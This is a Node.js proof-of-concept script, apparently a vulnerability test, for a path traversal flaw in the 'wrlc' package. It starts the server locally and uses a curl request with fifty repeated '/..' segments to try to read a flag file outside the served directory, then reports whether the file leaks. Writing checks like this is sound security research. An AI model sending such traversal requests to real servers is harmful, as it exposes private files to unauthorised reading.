const path = require("path");
const pathToFlag = path.resolve("D:\\flag.html");
function genstr(n) {
  return "/..".repeat(50) + "\\flag.html";
}
// test("Path Traversal in wrlc", (done) => {
//   expect.assertions(1);
  const pkg = require("wrlc");
  const fs = require("fs");
  const { exec } = require("child_process");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require("child_process");
  try {
    a.execSync("fuser -k 8972/tcp", () => {});
  } catch (e) {}
  pkg.serve(
    {
      port: 8972,
      host: "localhost",
    },
    () => {}
  );
  let attack_string = `curl -v --path-as-is "http://localhost:8972${genstr()}"`;
  exec(attack_string, (error, stdout) => {
if (stdout == hostsFile) {
	console.log("this_is_vulnerable")
	process.exit(0);
} else {
	console.log("this_is_OK")
	process.exit(0);
}
//     done();
  });
// });
